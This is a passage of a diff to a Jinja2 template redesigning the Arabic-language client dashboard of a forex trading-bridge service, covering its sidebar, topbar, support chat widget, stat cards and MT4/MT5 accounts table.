@@ -1,133 +1,481 @@
 {% extends "base.html" %}
-{% block title %}{{ page_title }} | TriBridge.io{% endblock %}
+{% block title %}{{ page_title }} | TrBridgo.io{% endblock %}
 {% block body_class %}dashboard-page{% endblock %}
 {% block content %}
-<aside class="side-nav">
-    <strong>TriBridge.io</strong>
-    <a class="{% if page == 'home' %}active{% endif %}" href="{{ url_for('dashboard') }}">الرئيسية</a>
-    <a class="{% if page == 'cards' %}active{% endif %}" href="{{ url_for('cards_page') }}">البطاقات</a>
-    <a class="{% if page == 'subscriptions' %}active{% endif %}" href="{{ url_for('subscriptions_page') }}">الاشتراكات</a>
-    <a class="{% if page == 'quick' %}active{% endif %}" href="{{ url_for('quick_link_page') }}">الربط السريع</a>
-    <a class="{% if page == 'wallet' %}active{% endif %}" href="{{ url_for('wallet_page') }}">المحفظة</a>
-    <a class="{% if page == 'referrals' %}active{% endif %}" href="{{ url_for('referrals_page') }}">دعوة الأصدقاء</a>
-    <a class="{% if page in ['marketing', 'marketing_detail'] %}active{% endif %}" href="{{ url_for('marketing_page') }}">Smart Marketing Center</a>
-    <a class="{% if page == 'support_center' %}active{% endif %}" href="{{ url_for('support_center_page') }}">الدعم الفني</a>
-    <a class="{% if page == 'deposit' %}active{% endif %}" href="{{ url_for('deposit') }}">الإيداع</a>
-    <a class="{% if page in ['card_deposit','card_deposit_payment','card_deposit_processing','card_deposit_verify','card_deposit_success'] %}active{% endif %}" href="{{ url_for('card_deposit') }}">💳 إيداع ببطاقة</a>
-    <a class="{% if page == 'payment_requests' %}active{% endif %}" href="{{ url_for('payment_requests_page') }}">طلبات الدفع</a>
-    <a class="{% if page == 'withdraw' %}active{% endif %}" href="{{ url_for('withdraw') }}">السحب</a>
-    <a class="{% if page == 'tickets' %}active{% endif %}" href="{{ url_for('tickets_page') }}">التذاكر</a>
-    <a class="{% if page == 'settings' %}active{% endif %}" href="{{ url_for('settings_page') }}">الإعدادات</a>
-    <form action="{{ url_for('logout') }}" method="post"><button>تسجيل الخروج</button></form>
+<div class="db-shell" id="dbShell">
+
+<!-- ═══════════════ SIDEBAR ═══════════════ -->
+<aside class="db-sidebar" id="dbSidebar">
+  <a class="db-brand" href="{{ url_for('dashboard') }}">
+    <div class="db-brand-logo">∞</div>
+    <div>
+      <span class="db-brand-name">TrBridgo.io</span>
+      <span class="db-brand-tag">Trading Bridge</span>
+    </div>
+  </a>
+
+  <nav class="db-nav">
+    <span class="db-nav-label">الرئيسية</span>
+    <a class="db-nav-link {% if page == 'home' %}active{% endif %}" href="{{ url_for('dashboard') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+      لوحة التحكم
+    </a>
+    <a class="db-nav-link {% if page == 'wallet' %}active{% endif %}" href="{{ url_for('wallet_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      المحفظة
+      <span class="db-nav-badge green">${{ "%.0f"|format(wallet.balance) }}</span>
+    </a>
+
+    <span class="db-nav-label">الحسابات</span>
+    <a class="db-nav-link {% if page == 'quick' %}active{% endif %}" href="{{ url_for('quick_link_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+      الربط السريع
+      {% if active_links > 0 %}<span class="db-nav-badge">{{ active_links }}</span>{% endif %}
+    </a>
+    <a class="db-nav-link {% if page == 'cards' %}active{% endif %}" href="{{ url_for('cards_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+      البطاقات
+      {% if subscription_cards|length > 0 %}<span class="db-nav-badge">{{ subscription_cards|length }}</span>{% endif %}
+    </a>
+    <a class="db-nav-link {% if page == 'subscriptions' %}active{% endif %}" href="{{ url_for('subscriptions_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+      الاشتراكات
+    </a>
+    <a class="db-nav-link {% if page == 'tickets' %}active{% endif %}" href="{{ url_for('tickets_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7"/></svg>
+      التذاكر
+    </a>
+
+    <span class="db-nav-label">المالية</span>
+    <a class="db-nav-link {% if page == 'deposit' %}active{% endif %}" href="{{ url_for('deposit') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>
+      الإيداع
+    </a>
+    <a class="db-nav-link {% if page in ['card_deposit','card_deposit_payment','card_deposit_processing','card_deposit_verify','card_deposit_success'] %}active{% endif %}" href="{{ url_for('card_deposit') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/><line x1="8" y1="15" x2="8" y2="15" stroke-width="3" stroke-linecap="round"/></svg>
+      إيداع ببطاقة
+    </a>
+    <a class="db-nav-link {% if page == 'payment_requests' %}active{% endif %}" href="{{ url_for('payment_requests_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+      طلبات الدفع
+    </a>
+    <a class="db-nav-link {% if page in ['withdraw','local_withdraw'] %}active{% endif %}" href="{{ url_for('withdraw') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+      السحب
+    </a>
+
+    <span class="db-nav-label">المزيد</span>
+    <a class="db-nav-link {% if page == 'referrals' %}active{% endif %}" href="{{ url_for('referrals_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+      دعوة الأصدقاء
+    </a>
+    <a class="db-nav-link {% if page in ['marketing','marketing_detail'] %}active{% endif %}" href="{{ url_for('marketing_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+      Smart Marketing
+    </a>
+    <a class="db-nav-link {% if page == 'support_center' %}active{% endif %}" href="{{ url_for('support_center_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 18v-6a9 9 0 0118 0v6"/><path d="M21 19a2 2 0 01-2 2h-1a2 2 0 01-2-2v-3a2 2 0 012-2h3zM3 19a2 2 0 002 2h1a2 2 0 002-2v-3a2 2 0 00-2-2H3z"/></svg>
+      الدعم الفني
+    </a>
+    <a class="db-nav-link {% if page == 'settings' %}active{% endif %}" href="{{ url_for('settings_page') }}">
+      <svg class="db-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
+      الإعدادات
+    </a>
+  </nav>
+
+  <div class="db-sidebar-bottom">
+    <div class="db-sidebar-user">
+      <img class="db-sidebar-avatar" src="{{ profile_image_url }}" alt="">
+      <div class="db-sidebar-user-info">
+        <div class="db-sidebar-user-name">{{ user.full_name }}</div>
+        <div class="db-sidebar-user-plan">
+          <span class="db-sidebar-user-plan-dot"></span>
+          {% if user.subscription_active %}عضو مميز{% else %}تجريبي{% endif %}
+        </div>
+      </div>
+    </div>
+    <form action="{{ url_for('logout') }}" method="post">
+      <button type="submit" class="db-logout-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        تسجيل الخروج
+      </button>
+    </form>
+  </div>
 </aside>
 
-<main class="dash">
-    <header class="dash-header">
-        <div>
-            <a class="profile-greeting" href="{{ url_for('settings_page') }}">
-                <img src="{{ profile_image_url }}" alt="صورة الحساب" class="profile-avatar">
-                <span class="pill">مرحبًا، {{ user.full_name }}</span>
-            </a>
-            <h1>{{ page_title }}</h1>
-        </div>
-        <div class="client-topbar-actions">
-            <button class="client-icon-button" type="button" aria-label="الإشعارات">
-                <span>🔔</span>
-                <b>{{ notifications|length }}</b>
-            </button>
-            <button class="client-icon-button" type="button" data-open-client-support aria-label="الرسائل">
-                <span>💬</span>
-            </button>
-            <a class="client-user-menu" href="{{ url_for('settings_page') }}">
-                <img src="{{ profile_image_url }}" alt="صورة المستخدم">
-                <span>
-                    <strong>{{ user.full_name }}</strong>
-                    <small>{% if user.subscription_active %}عضو مميز{% else %}عضو تجريبي{% endif %}</small>
-                </span>
-                <em>⌄</em>
-            </a>
-            <div class="trial-box compact {% if not services_active %}expired{% endif %}">
-                {% if services_active %}
-                    <b>{{ trial.days }}</b><span>يوم</span>
-                {% else %}
-                    <b>انتهت</b><a href="{{ url_for('subscriptions_page') }}">تفعيل</a>
-                {% endif %}
-            </div>
-        </div>
-    </header>
+<!-- ═══════════════ TOPBAR ═══════════════ -->
+<header class="db-topbar">
+  <button class="db-mobile-menu-btn db-icon-btn" type="button" id="dbMenuBtn" aria-label="القائمة">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+  </button>
+  <div class="db-topbar-title">
+    <h1>{{ page_title }}</h1>
+    <span class="db-topbar-breadcrumb">TrBridgo.io / {{ page_title }}</span>
+  </div>
+  <div class="db-topbar-search">
+    <svg class="db-topbar-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input placeholder="بحث في لوحة التحكم..." type="search">
+  </div>
+  <div class="db-topbar-actions">
+    {% if services_active %}
+    <div class="trial-box compact"><b>{{ trial.days }}</b><span>يوم</span></div>
+    {% else %}
+    <div class="trial-box compact expired"><b>انتهت</b><a href="{{ url_for('subscriptions_page') }}">تفعيل</a></div>
+    {% endif %}
+    <button class="db-icon-btn" type="button" aria-label="الإشعارات">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="17"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>
+      {% if notifications|length > 0 %}<span class="db-icon-btn-badge">{{ notifications|length }}</span>{% endif %}
+    </button>
+    <button class="db-icon-btn" type="button" data-open-client-support aria-label="الرسائل">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="17"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
+    </button>
+    <button class="db-theme-btn" id="dbThemeBtn" type="button" aria-label="تبديل المظهر">🌙</button>
+    <a class="db-topbar-user" href="{{ url_for('settings_page') }}">
+      <img class="db-topbar-avatar" src="{{ profile_image_url }}" alt="">
+      <div>
+        <div class="db-topbar-user-name">{{ user.full_name }}</div>
+        <div class="db-topbar-user-role">{% if user.subscription_active %}عضو مميز{% else %}تجريبي{% endif %}</div>
+      </div>
+    </a>
+  </div>
+</header>
 
-    <div class="rich-support-widget client-support-widget" data-rich-support>
-        <button class="rich-support-button" type="button" data-support-toggle aria-label="فتح الدعم الفني">
-            <span>💬</span>
+<!-- ═══════════════ MAIN ═══════════════ -->
+<main class="db-main">
+
+  <!-- Support Widget -->
+  <div class="sw-widget" data-rich-support>
+    <button class="sw-fab" type="button" data-support-toggle aria-label="فتح الدعم">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="22"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
+    </button>
+    <section class="sw-window" data-support-window aria-live="polite">
+      <header class="sw-header">
+        <div>
+          <strong>الدعم الفني</strong>
+          <p>ردود الوكلاء تظهر هنا مباشرة.</p>
+        </div>
+        <button type="button" data-support-sound class="sw-mute-btn">🔔</button>
+      </header>
+      <div class="sw-thread" data-support-thread></div>
+      <div class="sw-identity" data-support-identity>
+        <input data-identity-name placeholder="اسمك" value="{{ user.full_name }}" readonly>
+      </div>
+      <form class="sw-composer" data-support-form>
+        <textarea class="sw-textarea" name="message" placeholder="اكتب رسالتك..." required></textarea>
+        <button class="sw-send-btn" type="submit" data-keep-text="1">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
         </button>
-        <section class="rich-support-window" data-support-window aria-live="polite">
-            <header>
-                <div>
-                    <strong>الدعم الفني</strong>
-                    <p>رسائلك وردود الوكلاء تظهر هنا.</p>
+      </form>
+      <p class="sw-status" data-support-status></p>
+    </section>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       HOME — MT4/MT5 ACCOUNT DASHBOARD
+  ══════════════════════════════════════ -->
+  {% if page == "home" %}
+
+  {% if not services_active %}
+  <div class="db-trial-banner expired">
+    <span class="db-trial-icon">⚠️</span>
+    <div class="db-trial-text">
+      <b>انتهت فترة التجربة</b>
+      <small>لا يمكن الوصول إلى الخدمات. يرجى تفعيل الاشتراك للمتابعة.</small>
+    </div>
+    <a class="db-btn db-btn-primary" href="{{ url_for('subscriptions_page') }}">تفعيل الاشتراك</a>
+  </div>
+  {% elif trial.days <= 3 %}
+  <div class="db-trial-banner">
+    <span class="db-trial-icon">⏳</span>
+    <div class="db-trial-text">
+      <b>{{ trial.days }} أيام متبقية في الاشتراك</b>
+      <small>يُنصح بتجديد الاشتراك قبل الانتهاء لضمان استمرارية الخدمة.</small>
+    </div>
+    <a class="db-btn db-btn-primary" href="{{ url_for('subscriptions_page') }}">تجديد الاشتراك</a>
+  </div>
+  {% endif %}
+
+  <!-- Stats Row -->
+  <div class="db-stats-row">
+    <div class="db-stat-card">
+      <div class="db-stat-icon blue">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+      </div>
+      <div class="db-stat-body">
+        <b>{{ links|length }}</b>
+        <small>إجمالي الحسابات</small>
+        <em class="up">↑ جميع المنصات</em>
+      </div>
+    </div>
+    <div class="db-stat-card">
+      <div class="db-stat-icon green">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <div class="db-stat-body">
+        <b>{{ links | selectattr('status', 'search', 'نجاح|مرتبط|Live') | list | length }}</b>
+        <small>حسابات نشطة</small>
+        <em class="up">↑ متصلة بالخوادم</em>
+      </div>
+    </div>
+    <div class="db-stat-card">
+      <div class="db-stat-icon orange">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+      </div>
+      <div class="db-stat-body">
+        <b>{{ subscription_cards|length }}</b>
+        <small>بطاقات الاشتراك</small>
+        <em>{{ subscription_cards | selectattr('status', 'equalto', 'نشطة') | list | length }} نشطة</em>
+      </div>
+    </div>
+    <div class="db-stat-card">
+      <div class="db-stat-icon purple">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      </div>
+      <div class="db-stat-body">
+        <b>${{ "%.2f"|format(wallet.balance) }}</b>
+        <small>رصيد المحفظة</small>
+        <em class="up">↑ ${{ "%.2f"|format(wallet.deposits) }} إجمالي إيداعات</em>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Grid: Table + Detail -->
+  <div class="db-grid-main">
+
+    <!-- Accounts Table -->
+    <div class="db-card">
+      <div class="db-card-head">
+        <div>
+          <h3>حسابات MT4 / MT5</h3>
+          <p>جميع حسابات التداول المرتبطة بحسابك</p>
+        </div>
+        <div class="db-card-actions">
+          <div class="db-tabs" id="acctTabs">
+            <button class="db-tab active" data-tab="all">الكل</button>
+            <button class="db-tab" data-tab="connected">نشط</button>
+            <button class="db-tab" data-tab="pending">قيد المعالجة</button>
+          </div>
+          <a class="db-btn db-btn-primary" href="{{ url_for('quick_link_page') }}">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="14"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+            ربط جديد
+          </a>
+        </div>
+      </div>
+      {% if links %}
+      <div style="overflow-x:auto;">
+        <table class="db-accounts-table" id="acctTable">
+          <thead>
+            <tr>
+              <th>المنصة</th>
+              <th>شركة الوساطة</th>
+              <th>رقم الحساب</th>
+              <th>الرافعة</th>
+              <th>الرصيد</th>
+              <th>الحالة</th>
+              <th>إجراءات</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for link in links %}
+            {%- set st = 'connected' if ('نجاح' in link.status or 'مرتبط' in link.status) else 'pending' if ('قيد' in link.status or 'مراجعة' in link.status) else 'disconnected' if ('مرفوض' in link.status or 'رفض' in link.status) else 'review' -%}
+            {%- set pl = link.account_type | lower -%}
+            <tr class="db-acct-row" data-id="{{ link.id }}" data-status="{{ st }}"
+                data-broker="{{ link.broker }}"
+                data-platform="{{ link.account_type }}"
+                data-num="{{ link.account_number }}"
+                data-leverage="{{ link.leverage }}"
+                data-balance="{{ link.balance }}"
+                data-status-label="{{ link.status }}"
+                data-date="{{ link.created_at }}">
+              <td>
+                <span class="db-platform-badge {{ 'mt5' if pl == 'mt5' else 'mt4' if pl == 'mt4' else 'ct' }}">
+                  {{ link.account_type }}
+                </span>
+              </td>
+              <td>
+                <div class="db-account-broker">
+                  <div class="db-broker-avatar">{{ link.broker[:2] | upper }}</div>
+                  <span>{{ link.broker }}</span>
                 </div>
-                <button type="button" data-support-sound>الصوت: تشغيل</button>
-            </header>
-            <div class="rich-support-thread" data-support-thread></div>
-            <form class="rich-support-form" data-support-form>
-                <textarea name="message" placeholder="اكتب رسالتك للدعم الفني..." required></textarea>
-                <button type="submit" data-keep-text="1">إرسال</button>
-            </form>
-            <p class="rich-support-status" data-support-status></p>
-        </section>
+              </td>
+              <td>
+                <span class="db-account-num">
+                  {% if link.account_number %}
+                    <span class="db-account-num-masked">••••</span> {{ link.account_number[-4:] if link.account_number|length > 4 else link.account_number }}
+                  {% else %}—{% endif %}
+                </span>
+              </td>
+              <td>{{ link.leverage or '—' }}</td>
+              <td>${{ "%.2f"|format(link.balance | float) if link.balance else '0.00' }}</td>
+              <td>
+                <span class="db-status {{ st }}">
+                  <span class="db-status-dot"></span>
+                  {{ link.status }}
+                </span>
+              </td>
+              <td>
+                <div class="db-row-actions">
+                  <button class="db-row-btn primary-btn db-detail-btn" title="تفاصيل" data-id="{{ link.id }}">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                  </button>
+                  <a class="db-row-btn" href="{{ url_for('quick_link_page') }}" title="إدارة الربط">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+                  </a>
+                </div>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      {% else %}
+      <div class="db-empty">
+        <div class="db-empty-icon">🔗</div>
+        <p>لا توجد حسابات مرتبطة بعد</p>
+        <a class="db-btn db-btn-primary" href="{{ url_for('quick_link_page') }}">ربط حساب MT4 / MT5</a>
+      </div>
+      {% endif %}
     </div>
 
-    {% if page == "home" %}
-    <section class="grid two">
-        <a class="subscription-stack-link" href="{{ url_for('cards_page') }}" aria-label="عرض بطاقاتي">
-            <div class="subscription-stack">
-                {% if subscription_cards %}
-                    {% for sub_card in subscription_cards[:3] %}
-                    <article class="premium-card mini-stack {{ sub_card.card_type|lower }} {% if sub_card.status == 'نشطة' %}live{% endif %}" style="--i: {{ loop.index0 }}">
-                        <span>{{ sub_card.card_type }}</span>
-                        <strong>{% if sub_card.status == 'نشطة' and sub_card.visible_balance is not none %}$ {{ "%.2f"|format(sub_card.visible_balance) }}{% else %}{{ user.full_name }}{% endif %}</strong>
-                        <small>{{ sub_card.status }}{% if sub_card.status == 'نشطة' and sub_card.trading_account_number %} • {{ sub_card.trading_account_number }}{% endif %}</small>
-                    </article>
-                    {% endfor %}
-                {% else %}
-                    <article class="premium-card mini-stack basic">
-                        <span>Subscriptions</span>
-                        <strong>اعتمد بطاقتك</strong>
-                        <small>اضغط للانتقال إلى البطاقات</small>
-                    </article>
-                {% endif %}
-            </div>
-        </a>
-        <article class="panel wallet">
-            <h2>ملخص المحفظة</h2>
-            <div class="stats">
-                <span>الرصيد الحالي <b>${{ "%.2f"|format(wallet.balance) }}</b></span>
-                <span>الإيداعات <b>${{ "%.2f"|format(wallet.deposits) }}</b></span>
-                <span>السحوبات <b>${{ "%.2f"|format(wallet.withdrawals) }}</b></span>
-            </div>
-            <div class="actions">
-                <a class="primary" href="{{ url_for('deposit') }}">إيداع</a>
-                <a class="secondary" href="{{ url_for('withdraw') }}">سحب</a>
-            </div>
-        </article>
-    </section>
-    <section class="grid two">
-        <article class="panel">
-            <h2>حالة الربط السريع</h2>
-            {% for link in links[:3] %}
-            <p class="notice">{{ link.account_type }} - {{ link.broker }}: {{ link.status }}</p>
-            {% else %}
-            <p>لا توجد طلبات ربط بعد.</p>
-            {% endfor %}
-            <a class="secondary" href="{{ url_for('quick_link_page') }}">إدارة الربط</a>
-        </article>
-        <article class="panel">
-            <h2>الإشعارات الجديدة</h2>
-            {% for note in notifications %}<p class="notice">{{ note.message }}</p>{% else %}<p>لا توجد إشعارات.</p>{% endfor %}
-        </article>
-    </section>
-    {% endif %}
+    <!-- Detail + Quick Actions -->
+    <div class="db-detail-panel" id="dbDetailPanel">
 
+      <!-- MT Card visual -->
+      <div class="db-card" id="dbMtCard">
+        <div class="db-card-head">
+          <h3>تفاصيل الحساب</h3>
+        </div>
+        <div class="db-card-body">
+          <div class="db-mt-card empty" id="dbMtCardVisual">
+            <div class="db-mt-card-glare"></div>
+            <div class="db-mt-card-top">
+              <span class="db-mt-card-platform" id="dbCardPlatform">MT5</span>
+              <span class="db-mt-card-logo">∞</span>
+            </div>
+            <div class="db-mt-card-num" id="dbCardNum">•••• •••• ••••</div>
+            <div class="db-mt-card-bottom">
+              <div>
+                <div class="db-mt-card-label">شركة الوساطة</div>
+                <div class="db-mt-card-value" id="dbCardBroker">اختر حساباً</div>
+              </div>
+              <div>
+                <div class="db-mt-card-label">الرصيد</div>
+                <div class="db-mt-card-value" id="dbCardBalance">$0.00</div>
+              </div>
+              <div class="db-mt-card-status-dot offline" id="dbCardDot"></div>
+            </div>
+          </div>
+          <dl class="db-detail-info" id="dbDetailInfo" style="margin-top:14px;">
+            <div class="db-detail-row"><dt>المنصة</dt><dd id="dPlatform">—</dd></div>
+            <div class="db-detail-row"><dt>الوسيط</dt><dd id="dBroker">—</dd></div>
+            <div class="db-detail-row"><dt>رقم الحساب</dt><dd id="dNum">—</dd></div>
+            <div class="db-detail-row"><dt>الرافعة</dt><dd id="dLeverage">—</dd></div>
+            <div class="db-detail-row"><dt>الرصيد</dt><dd id="dBalance">—</dd></div>
+            <div class="db-detail-row"><dt>الحالة</dt><dd id="dStatus">—</dd></div>
+            <div class="db-detail-row"><dt>التاريخ</dt><dd id="dDate">—</dd></div>
+          </dl>
+          {% if not links %}
+          <p style="font-size:.82rem;color:var(--db-muted);text-align:center;margin-top:10px;">اضغط على أي حساب لعرض تفاصيله</p>
+          {% endif %}
+        </div>
+      </div>
+
+      <!-- Quick actions -->
+      <div class="db-card">
+        <div class="db-card-head"><h3>إجراءات سريعة</h3></div>
+        <div class="db-card-body">
+          <div class="db-quick-actions">
+            <a class="db-quick-action" href="{{ url_for('quick_link_page') }}">
+              <div class="db-quick-action-icon green">🔗</div>
+              <div class="db-quick-action-text">
+                <span class="db-quick-action-label">ربط حساب جديد</span>
+                <span class="db-quick-action-sub">MT4 / MT5 / cTrader</span>
+              </div>
+              <span class="db-quick-action-arrow">←</span>
+            </a>
+            <a class="db-quick-action" href="{{ url_for('deposit') }}">
+              <div class="db-quick-action-icon blue">⬇️</div>
+              <div class="db-quick-action-text">
+                <span class="db-quick-action-label">إيداع رصيد</span>
+                <span class="db-quick-action-sub">USDT، Vodafone Cash...</span>
+              </div>
+              <span class="db-quick-action-arrow">←</span>
+            </a>
+            <a class="db-quick-action" href="{{ url_for('card_deposit') }}">
+              <div class="db-quick-action-icon orange">💳</div>
+              <div class="db-quick-action-text">
+                <span class="db-quick-action-label">إيداع ببطاقة</span>
+                <span class="db-quick-action-sub">Visa / MasterCard</span>
+              </div>
+              <span class="db-quick-action-arrow">←</span>
+            </a>
+            <a class="db-quick-action" href="{{ url_for('withdraw') }}">
+              <div class="db-quick-action-icon purple">⬆️</div>
+              <div class="db-quick-action-text">
+                <span class="db-quick-action-label">سحب رصيد</span>
+                <span class="db-quick-action-sub">الحد الأدنى $10</span>
+              </div>
+              <span class="db-quick-action-arrow">←</span>
+            </a>
+            <a class="db-quick-action" href="{{ url_for('support_center_page') }}">
+              <div class="db-quick-action-icon blue">🎧</div>
+              <div class="db-quick-action-text">
+                <span class="db-quick-action-label">الدعم الفني</span>
+                <span class="db-quick-action-sub">تحدث مع وكيل</span>
+              </div>
+              <span class="db-quick-action-arrow">←</span>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Notifications -->
+      {% if notifications %}
+      <div class="db-card">
+        <div class="db-card-head"><h3>الإشعارات</h3><span style="font-size:.75rem;color:var(--db-muted);">{{ notifications|length }} جديد</span></div>
+        <div class="db-card-body">
+          <div class="db-activity-feed">
+            {% for note in notifications[:5] %}
+            <div class="db-activity-item">
+              <span class="db-activity-dot blue"></span>
+              <div class="db-activity-text">
+                <div class="db-activity-label">{{ note.message }}</div>
+                <div class="db-activity-time">{{ note.created_at }}</div>
+              </div>
+            </div>
+            {% endfor %}
+          </div>
+        </div>
+      </div>
+      {% endif %}
+
+    </div><!-- /detail panel -->
+  </div><!-- /grid main -->
+
+  <!-- Subscription Cards Overview -->
+  {% if subscription_cards %}
+  <div class="db-card">
+    <div class="db-card-head">
+      <div><h3>بطاقات الاشتراك</h3><p>بطاقاتك النشطة المرتبطة بحسابات التداول</p></div>
+      <a class="db-btn db-btn-secondary" href="{{ url_for('cards_page') }}">عرض الكل</a>
+    </div>
+    <div class="db-card-body" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;">
+      {% for sub_card in subscription_cards[:4] %}
+      <article class="premium-card full-card {{ sub_card.card_type|lower }} {% if sub_card.status == 'نشطة' %}live{% endif %}">
